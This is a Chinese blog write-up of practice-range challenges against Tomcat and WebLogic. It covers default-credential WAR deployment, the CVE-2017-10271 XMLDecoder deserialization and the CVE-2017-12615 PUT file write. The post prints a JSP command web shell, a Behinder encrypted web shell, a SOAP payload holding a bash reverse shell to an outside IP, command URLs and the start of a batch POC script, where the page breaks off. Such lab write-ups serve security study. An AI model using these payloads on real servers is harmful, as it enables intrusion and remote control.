<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>安鸾之中间件系列 | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",favicon:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",avatar:"https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">安鸾之中间件系列</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv4</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-08-28 01:28:23</span> <span class="mobile">2022-08-28 01:28</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2022-11-23 12:26:52</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/whalwl/">安鸾</a>&nbsp;</li><li>| <a href="/tags/middleware/">中间件</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><blockquote><p>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！<br>本文首发于涂寐’s Blogs：<a class="link" target="_blank" rel="noopener" href="https://0xtlu.github.io/">https://0xtlu.github.io<i class="fas fa-external-link-alt"></i></a>，转载请注明出处！</p></blockquote><h1 id="0x00-tomcat8弱口令"><a href="#0x00-tomcat8弱口令" class="headerlink" title="0x00 tomcat8弱口令"></a>0x00 tomcat8弱口令</h1><h2 id="0o00-题目提示"><a href="#0o00-题目提示" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat8弱口令</span><br><span class="line"></span><br><span class="line">题目URL：http://<span class="number">106.15</span>.<span class="number">50.112</span>:<span class="number">18081</span></span><br><span class="line"></span><br><span class="line">提示：flag在网站根目录下！</span><br></pre></td></tr></table></figure><h2 id="0o01-测试过程"><a href="#0o01-测试过程" class="headerlink" title="0o01 测试过程"></a>0o01 测试过程</h2><ul><li><p>随便找篇文章查看，访问：<code>http://106.15.50.112:18081/manager/html</code>。</p></li><li><p>弹窗输入账密：<code>tomcat/tomcat</code></p></li><li><p>jsp 代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=GBK&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;一句话木马&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))) &#123;</span><br><span class="line">            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            <span class="type">int</span> <span class="built_in">len</span> = <span class="number">-1</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="built_in">new</span> <span class="type">byte</span>[<span class="number">4092</span>];</span><br><span class="line">            out.<span class="built_in">print</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">            while ((<span class="built_in">len</span> = input.read(bytes)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                out.<span class="built_in">println</span>(<span class="built_in">new</span> String(bytes, <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            out.<span class="built_in">print</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>制作 war 包，jsp文件压缩成 zip 文件，改后缀为 war。上传站点。</p></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.5duy4o951s00.jpg?raw=true" alt="tumeiimage"></p><ul><li>部分命令使用。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 看不到 flag 相关文件</span></span><br><span class="line">http:<span class="comment">//106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看当前位置：/usr/local/tomcat</span></span><br><span class="line">http:<span class="comment">//106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=pwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不懂 tomcat，直接查找包含 flag 的文件</span></span><br><span class="line">http:<span class="comment">//106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=find%20/%20-name%20*flag*</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿 flag：flag&#123;828a7a1a2c4bdc5b287f0d0fe72cf0ff&#125;</span></span><br><span class="line">http:<span class="comment">//106.15.50.112:18081/jsp/jsp.jsp?pwd=admin&amp;cmd=cat%20/usr/local/tomcat/webapps/ROOT/this_flag_2c4bdc5b287f0d0f.txt</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.9ckdykgwbko.jpg?raw=true" alt="tumeiimage"></p><h2 id="0o02-Tomcat-目录结构"><a href="#0o02-Tomcat-目录结构" class="headerlink" title="0o02 Tomcat 目录结构"></a>0o02 Tomcat 目录结构</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bin-----存放Tomcat的脚本文件，例如启动、关闭</span><br><span class="line">conf----Tomcat的配置文件，例如server.xml和web.xml</span><br><span class="line">lib-----存放Tomcat运行需要的库文件（JAR包）</span><br><span class="line">logs----存放Tomcat执行时的LOG文件</span><br><span class="line">temp----存放Tomcat运行时所产生的临时文件</span><br><span class="line">webapps-Web发布目录，默认情况下把Web应用文件放于此目录</span><br><span class="line">work----存放jsp编译后产生的class文件</span><br><span class="line">里面一些重要的文件，需要了解其作用：</span><br><span class="line">server.xml：配置tomcat启动的端口号、host主机、Context等</span><br><span class="line">web.xml文件：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet</span><br><span class="line">tomcat-users.xml：tomcat的用户密码与权限。</span><br></pre></td></tr></table></figure><h1 id="0x01-Weblogic弱口令-amp-反序列化"><a href="#0x01-Weblogic弱口令-amp-反序列化" class="headerlink" title="0x01 Weblogic弱口令&amp;反序列化"></a>0x01 Weblogic弱口令&amp;反序列化</h1><h2 id="0o00-题目提示-1"><a href="#0o00-题目提示-1" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Weblogic弱口令&amp;反序列化</span><br><span class="line"></span><br><span class="line">网站URL：http://<span class="number">106.15</span>.<span class="number">50.112</span>:<span class="number">17001</span></span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">本环境存在大量漏洞：</span><br><span class="line">控制台弱口令、CVE-<span class="number">2014</span>-<span class="number">4210</span>、CVE-<span class="number">2017</span>-<span class="number">3506</span>、CVE-<span class="number">2017</span>-<span class="number">10271</span>、CVE-<span class="number">2018</span>-<span class="number">2628</span>、CVE-<span class="number">2019</span>-<span class="number">2725</span>、CVE-<span class="number">2020</span>-<span class="number">14882</span>、CVE-<span class="number">2020</span>-<span class="number">14883</span></span><br></pre></td></tr></table></figure><h2 id="0o01-测试过程-1"><a href="#0o01-测试过程-1" class="headerlink" title="0o01 测试过程"></a>0o01 测试过程</h2><h3 id="0b00-控制台弱口令"><a href="#0b00-控制台弱口令" class="headerlink" title="0b00 控制台弱口令"></a>0b00 控制台弱口令</h3><ul><li>直接访问给的链接，404，听说是正常的。看别人复现吧。</li><li>默认后台：<code>http://106.15.50.112:17001/console/login/LoginForm.jsp</code></li><li>默认口令： <code>weblogic</code> &#x2F; <code>Oracle@123</code></li><li>部署 –&gt; 安装 –&gt; 上载文件 –&gt; 将部署上载到管理服务器 –&gt; 一直下一步到完成。</li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.1wuuikqlyvuo.jpg?raw=true" alt="tumeiimage"></p><ul><li>这里是冰蝎马，但还是得 find 。</li><li>flag 路径：<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/this_is_flag7cd3d2fc9cec6901.txt</code></li><li>flag：<code>flag&#123;04c89e5c3d0d926f510ba9e8ebd513bf&#125;</code></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.4wl8v8orjno0.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b01-CVE-2017-10271"><a href="#0b01-CVE-2017-10271" class="headerlink" title="0b01 CVE-2017-10271"></a>0b01 CVE-2017-10271</h3><ul><li>CVE-2017-10271 WebLogic XMLDecoder 反序列化漏洞由 WebLogic Server WLS 组件远程命令执行漏洞，由 wls-wsat.war 触发该漏洞。该漏洞可通过构建 post 请求发送恶意 SOAP（xml） 数据，在解析过程中触发该漏洞。</li><li>如下页面则可能存在，访问链接<code>http://106.15.50.112:17001/wls-wsat/CoordinatorPortType11</code></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.56lfe8p3xow0.jpg?raw=true" alt="tumeiimage"></p><ul><li>构造请求包。</li><li>GET 请求改为 POST 请求。</li><li>添加请求头：<code>Content-Type: text/xml</code></li><li>加上大佬构造成反弹 Shell 的 SOAP 数据。</li><li>此处修改反弹 shell 的 bash 命令，改为写马：<code>echo hello whalwl&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/hello.txt</code>；</li><li>服务器路径：<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/hello.txt</code>；</li><li>网页链接：<code>http://106.15.50.112:17001/wls-wsat/hello.txt</code><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType11 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">17001</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: text/xml</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span><span class="number">.5060</span><span class="number">.66</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span><span class="number">.1264</span><span class="number">.44</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: type=posttime; Hm_lvt_48042604b3c7a9973810a87540843e34=1656610521,1656611930,1656635518,1656651819; roc_login=a111; roc_secure=ijcS7EUXP2kc7dX6cmEa%252BHh%252BvGfhfh49pUdHpDOaiSo%253D; ADMINCONSOLESESSION=btqbv13Llmvpp98hgvcB01Kdw5rDvXDdsg2VYcXrrPhm081MGkmk!-1333354029; JSESSIONID=lrBMv15Nmclr6jvxvgncp7k0pyGgzl2h1hQN3vRTXzHqycnGq4lm!-1333354029</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 644</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/120.24.241.34/6868 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="comment">&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;/array&gt;</span></span><br><span class="line"><span class="comment">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="comment">&lt;/java&gt;</span></span><br><span class="line"><span class="comment">&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.70eyp8ht2ck0.jpg?raw=true" alt="tumeiimage"></p><ul><li>直接拿工具扫不香吗</li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.6pffmh93qc00.jpg?raw=true" alt="tumeiimage"></p><h1 id="0x02-tomcat任意文件写入"><a href="#0x02-tomcat任意文件写入" class="headerlink" title="0x02 tomcat任意文件写入"></a>0x02 tomcat任意文件写入</h1><h2 id="0o00-题目提示-2"><a href="#0o00-题目提示-2" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tomcat任意文件写入</span><br><span class="line"></span><br><span class="line">题目URL：http://<span class="number">106.15</span>.<span class="number">50.112</span>:<span class="number">18082</span></span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line"><span class="number">1</span>、Tomcat <span class="keyword">PUT</span>方法任意写文件漏洞(CVE-<span class="number">2017</span>-<span class="number">12615</span>)</span><br><span class="line"><span class="number">2</span>、flag在网站根目录下！</span><br></pre></td></tr></table></figure><h2 id="0o01-测试过程-2"><a href="#0o01-测试过程-2" class="headerlink" title="0o01 测试过程"></a>0o01 测试过程</h2><h3 id="0b00-手工测试"><a href="#0b00-手工测试" class="headerlink" title="0b00 手工测试"></a>0b00 手工测试</h3><ul><li>抓取 <code>http://106.15.50.112:18082</code> 界面请求包；</li><li>GET 请求修改为 PUT 请求；</li><li>末尾添加冰蝎 jsp 木马。</li><li>URL：<code>http://106.15.50.112:18082/shell666.jsp</code><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell666.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">106.15</span><span class="number">.50</span><span class="number">.112</span>:<span class="number">18082</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span><span class="number">.5060</span><span class="number">.66</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span><span class="number">.1264</span><span class="number">.44</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: type=posttime; Hm_lvt_48042604b3c7a9973810a87540843e34=1656610521,1656611930,1656635518,1656651819; roc_login=a111; roc_secure=ijcS7EUXP2kc7dX6cmEa%252BHh%252BvGfhfh49pUdHpDOaiSo%253D; ADMINCONSOLESESSION=SyzfvQTGZnSCmkjnnGcV8TJ38v5bGk5m4VkHGmD8gyCDtLTdbQbT!-1333354029; JSESSIONID=CBB3B0EC25E322680209BC5533CDC66E</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 614</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="built_in">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="built_in">new</span> U(this.getClass().getClassLoader()).g(c.doFinal(<span class="built_in">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.frnt3pzgq80.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b01-纸机大佬脚本"><a href="#0b01-纸机大佬脚本" class="headerlink" title="0b01 纸机大佬脚本"></a>0b01 纸机大佬脚本</h3><ul><li><p>纸机大佬写的POC</p></li><li><p>纸机大佬相关文章：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单个，注意网址</span></span><br><span class="line">python3 CVE<span class="number">-2017</span><span class="number">-15715</span>-POC.py.py -u http:<span class="comment">//106.15.50.112 -p 18082</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量</span></span><br><span class="line">python3 CVE<span class="number">-2017</span><span class="number">-15715</span>-POC.py.py -f IP.txt</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#CVE<span class="number">-2017</span><span class="number">-12615</span> POC</span><br><span class="line">__author__ = <span class="string">&#x27;纸机&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">parse = optparse.OptionParser(usage = <span class="string">&#x27;python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,dest=<span class="string">&#x27;URL&#x27;</span>,help=<span class="string">&#x27;target url&#x27;</span>)</span><br><span class="line">parse.add_option(<span 